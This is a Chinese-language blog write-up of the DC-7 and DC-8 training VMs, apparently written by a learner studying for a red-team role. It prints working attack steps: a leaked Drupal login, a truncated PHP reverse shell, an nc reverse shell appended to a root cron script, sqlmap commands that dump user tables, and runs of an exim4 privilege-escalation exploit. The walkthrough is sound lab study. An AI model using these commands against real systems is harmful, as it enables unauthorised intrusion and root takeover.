今天刚投递了护网的简历，有点开心，最近几个月每天早9到晚上11点除了吃饭睡午觉都在学习，网络安全真的要学习的知识太多了，给自己加把劲，希望自己可以面上护网，期待努力后的自己。

靶机下载地址：[//www.five86.com/downloads.html" target="_blank" rel="noopener noreferrer nofollow"](https://www.five86.com/downloads.html:rel="nofollow noopener" href="https)

这个靶机同样是直接给ip的

![](img/c83cd9b7c3005bbc8a36f890fffc6c3b.png)

这个靶机在进入shell前是没有破绽的，并且进入主页面以后也并没有什么漏洞。如果不搜索一下这个靶机的解法很难去下一步操作。

在`github.com`上搜索`dc7user`然后选择code，里面可以找到dc7一个远程登陆的密码。

这个靶机应该就是想表达的就是源代码泄露漏洞，让你自己去搜索一些信息。

![](img/a6c870ec41477b1db2c6f50e312eb557.png)

同时我们利用`dirsearch` -u [//192.168.102.148扫描一下这个网站，发现一个登陆界面" target="_blank" rel="noopener noreferrer nofollow"](http://192.168.102.148扫描一下这个网站，发现一个登陆界面:rel="nofollow noopener" href="http")。

![](img/30ba57a5ec10671eed5673c1d0f40ee2.png)

![](img/fd114290ee61a3f654f7f612eab716fd.png)

```
$username = "dc7user";
$password = "MdR3xOgB7#dW";
```

![](img/95a339b5f493765c94cb50dc06ea08ee.png)

远程登陆上以后发现一个`mbox`文件，打开发现这里面其实指向了一个文件，就是`/opt/scripts/backups.sh`文件，并且是每隔15分钟运行一次

![](img/d2e9f0df1a94e1ca0329f20aac0cb4e5.png)

![](img/25f9f808381adf41d7782d2da078a01f.png)

我们查看一下这个文件，发现这是个root文件，并且`www-data`组的用户拥有全部权限。

![](img/612c9ab50d031c4b188b2a2a7587a29b.png)

我们进入`backups.sh`的目录`cat`一下，发现里面执行了一些代码。

![](img/dbba67879acfba8f44f6bc71d18266da.png)

同时我们在`/var/mail`下发现一个`dc7user`文件，这个文件显示了`backups.sh`每次执行的时间，每隔15分钟执行一次，并且发现了`backup.sh`执行的其他代码。

![](img/821561d3ed36ebb10bbaa9cc657c65b2.png)

![](img/802ae1086955d440ac61b97729bd13ce.png)

`backup.sh`每次执行的时候里面会运行一个`drush`命令，这个命令可以对drupal搭建的网站进行用户密码修改，我们可以利用重置密码这里来爆破用户名，当用户名正确的时候会发送电子邮件。

![](img/ead0a87779cf47726682d9ab53c412c0.png)

确认用户名是`admin`时候可以直接利用`drush`进行一个密码修改，然后我们再登陆。

![](img/946d4207bb05a7133c105371ff209a7d.png)

![](img/8f4fac1dc16a712645aecb735c6586b0.png)

登陆后发现唯一可以写代码的地方不支持php代码，我们就想着装个php插件，让可以运行php代码。

![](img/76e0787478eacdf12b7846a8226804cc.png)

在`Manage--Extend--List`下面可以添加插件，这里面找了找没有关于php的插件，就需要我们自己从网上找到来添加。

![](img/fa616ecff9d88f5663e39c0e6e37b43b.png)

这是一个插件的地址，输入就可以了。

下载地址：https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz

![](img/ec402a21fccf80af3759a1d9021fad5f.png)

点击`Install`就按照成功了。

![](img/f8290c9e8855b211b8e0a8edfafe6fe7.png)

再搜索`PHP`就找到`PHP`插件了，再点击`Install`。

![](img/4ba33ae0e5439291ea0265570251b2cc.png)

返回`Manage--Content`再点击`Edit`。

![](img/f4fac0b6f5dd844bd91d20ef1c137094.png)

发现这个可以插入代码的框框就可以输入`PHP`代码了，这时候我们插入一个`PHP`反弹shell。

![](img/fe41cd81991839ae12c6441952dcb77d.png)

```
 $sock, 
    1 => $sock, 
    2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
```

![](img/037ad7e5ed370daa4427b41a275dcdcd.png)

添加保存成功后再点击运行一下这个页面，反弹shell就成功启动了。

![](img/45ab53962c6c1ab168999fc6eb2f66a9.png)

![](img/6f2de619e42c5a5683376b07e583e906.png)

这时候我们就进入到了`www-data`的`shell`下，找到刚才的`backups.sh`文件，往里面追加一条反弹shell。然后等待这个文件下次自己运行，如果自己运行就是以`root`权限运行的，返回的`shell`就是`root`权限的`shell`，而如果我们自己运行就是普通账户运行的，是不能返回`root`权限的。

`echo "nc -e /bin/bash 192.168.102.129 8888“ >> backups.sh`

![](img/5bd3fe597e4769b49e31072f1b6946ae.png)

我们可以看到上次运行时间是22：15分，等到22：30就自动运行`backups.sh`这个文件了，我们也成功返回了`root`权限。

![](img/3446a8dbb60854d749471db14744ce94.png)

![](img/9ebce35e55fbb519acfa0156fe160d87.png)

## 【DC系列08】DC-8靶机复盘

靶机下载地址：[//www.five86.com/downloads.html" target="_blank" rel="noopener noreferrer nofollow"](https://www.five86.com/downloads.html:rel="nofollow noopener" href="https)

同样打开靶机后靶机进行一个扫描查找。

![](img/79f3f7004edbdabbfa66508efd083044.png)

扫描到ip后进行一个单独的扫描。

![](img/a4ad7b7c4159bf33e2fd78c12fa0f7f2.png)

再扫描一下目录，这里有一个登陆界面，等会儿会用上。

![](img/0cc2e1f3f2476fd27cfe6bed9e9a039f.png)

![](img/2ce58d42ad45f40bb35fc83d95764653.png)

```
sqlmap -u "http://192.168.102.150/?nid=2" --batch --dbs
```

![](img/174dc5abb9904c02b5fb03f0488bee05.png)

![](img/b52d21d78555f7c7b45ce44310c1fd01.png)

再对发现的数据库中的表进行一个扫描。

```
sqlmap -u "http://192.168.102.150/?nid=2" --batch -D d7db --tables
```

![](img/40e145ecb3582e298ea3287eb37d9a1a.png)

发现有个`users`表，列出来里面的条目。

```
sqlmap -u "http://192.168.102.150/?nid=2" --batch -D d7db -T users --columns
```

![](img/4bfe7f91910f163b798c2b8e6d19e864.png)

有一个名称和密码，我们单独提取出来

```
sqlmap -u "http://192.168.102.150/?nid=2" --batch -D d7db -T users -C "name,pass" --dump
```

![](img/4e39e4cd0a91dc5bfaf146a32378e695.png)

`admin`爆破不出来密码，`john`用户可以爆破出来密码。

![](img/96c1fec6a76a2270a35744fcfbc7cefb.png)

利用`john`工具爆破出`john`的密码是`turtle`

![](img/2865168c02c3e09605b407078e2ca55c.png)

然后登陆一下刚才扫描到的登陆网页。

![](img/09b87ed0b2e3d6163b0f9582364f73a8.png)

登陆后在网页中找了一圈，发现有一个可以注入`PHP`代码的地方。

![](img/9f045406d6b5848775954d36b2dbcec0.png)

![](img/b9943577c59d688795d58dd121feb8f7.png)

我们在这里面写一个反弹shell，反弹到我们自己的kali中去。

![](img/eb030cc2949d28e75a4e5712d117041e.png)

然后提交以下表单。

![](img/68ba983444e895eff08d7c7fcc66c4dd.png)

`kali`上就拿到了一个`web shell`权限。

![](img/7bcf3ff00d6699e4370bb7633c42023f.png)

然后利用`find / -perm -u=s -type f 2>/dev/null`查找以下有权限的文件，发现 有个`exim4`

![](img/1b7a3ef262fd6bd342bca661da9c55e2.png)

再`version`以下，看看`exim4`的版本号。

![](img/ba20d6434bb8184b1f50725458bc607e.png)

`kali`中搜索以下这个版本的漏洞，发现有一个合适的。。

![](img/e859c0b8fd6494176b7e1b48b34ea3d1.png)

我们下载下来并传到靶机中去。

![](img/81138ccda32dfb7181bb7183ddaa50f9.png)

`cat`了以下`46996.sh`发现有两种方法可以提权，我两种都用了一遍。

![](img/0a9801a18b1d001c6f724aae90018052.png)

第一种：`./46996.sh -m setuid`

第二种：`./46996.sh -m netcat`

![](img/afe5fc89230a582b706d7a9a2c941467.png)

这样就提权成功了。

![](img/32c968d3b041dea49f807fb5efd3d7b4.png)
